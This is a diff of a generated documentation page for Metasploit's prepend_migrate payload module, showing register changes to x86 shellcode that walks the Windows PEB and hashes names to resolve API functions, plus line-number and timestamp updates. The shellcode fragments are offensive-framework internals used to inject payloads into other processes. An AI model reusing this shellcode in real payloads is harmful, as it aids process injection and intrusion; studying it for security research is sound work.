@@ -554,9 +554,7 @@ for discussion.</p>
 285
 286
 287
-288
-289
-290</pre>
+288</pre>
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 59</span>
@@ -573,8 +571,8 @@ for discussion.</p>
 <span class='tstring_content'>  api_call:
     pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
     mov ebp, esp              ; Create a new stack frame
-    xor edx, edx              ; Zero EDX
-    mov edx, [fs:edx+48]      ; Get a pointer to the PEB
+    xor eax, eax              ; Zero EAX (upper 3 bytes will remain zero until function is found)
+    mov edx, [fs:eax+48]      ; Get a pointer to the PEB
     mov edx, [edx+12]         ; Get PEB-&gt;Ldr
     mov edx, [edx+20]         ; Get the first module from the InMemoryOrder module list
   next_mod:                   ;
@@ -582,7 +580,6 @@ for discussion.</p>
     movzx ecx, word [edx+38]  ; Set ECX to the length we want to check
     xor edi, edi              ; Clear EDI which will store the hash of the module name
   loop_modname:               ;
-    xor eax, eax              ; Clear EAX
     lodsb                     ; Read in the next byte of the name
     cmp al, &#39;a&#39;               ; Some versions of Windows use lower case module names
     jl not_lowercase          ;
@@ -597,10 +594,10 @@ for discussion.</p>
     push edi                  ; Save the current module hash for later
     ; Proceed to iterate the export address table
     mov edx, [edx+16]         ; Get this modules base address
-    mov eax, [edx+60]         ; Get PE header
+    mov ecx, [edx+60]         ; Get PE header
 
     ; use ecx as our EAT pointer here so we can take advantage of jecxz.
-    mov ecx, [eax+edx+120]    ; Get the EAT from the PE header
+    mov ecx, [ecx+edx+120]    ; Get the EAT from the PE header
     jecxz get_next_mod1       ; If no EAT present, process the next module
     add ecx, edx              ; Add the modules base address
     push ecx                  ; Save the current modules EAT
@@ -618,7 +615,6 @@ for discussion.</p>
     xor edi, edi              ; Clear EDI which will store the hash of the function name
     ; And compare it to the one we want
   loop_funcname:              ;
-    xor eax, eax              ; Clear EAX
     lodsb                     ; Read in the next byte of the ASCII function name
     ror edi, 13               ; Rotate right our hash value
     add edi, eax              ; Add the next byte of the name
@@ -650,7 +646,7 @@ for discussion.</p>
     ; We now automagically return to the correct caller...
 
   get_next_mod:               ;
-    pop eax                   ; Pop off the current (now the previous) modules EAT
+    pop edi                   ; Pop off the current (now the previous) modules EAT
   get_next_mod1:              ;
     pop edi                   ; Pop off the current (now the previous) modules hash
     pop edx                   ; Restore our position in the module list
@@ -869,6 +865,8 @@ for discussion.</p>
       <pre class="lines">
 
 
+291
+292
 293
 294
 295
@@ -1097,12 +1095,10 @@ for discussion.</p>
 518
 519
 520
-521
-522
-523</pre>
+521</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 293</span>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/prepend_migrate.rb', line 291</span>
 
 <span class='kw'>def</span> <span class='id identifier rubyid_prepend_migrate_64'>prepend_migrate_64</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
   <span class='id identifier rubyid_payloadsize'>payloadsize</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%04x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='id identifier rubyid_buf'>buf</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span>
@@ -1416,7 +1412,7 @@ for discussion.</p>
 </div>
 
     <div id="footer">
-  Generated on Mon Dec  8 15:51:05 2014 by
+  Generated on Wed Dec 17 15:14:41 2014 by
   <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
   0.8.7.4 (ruby-2.1.5).
 </div>
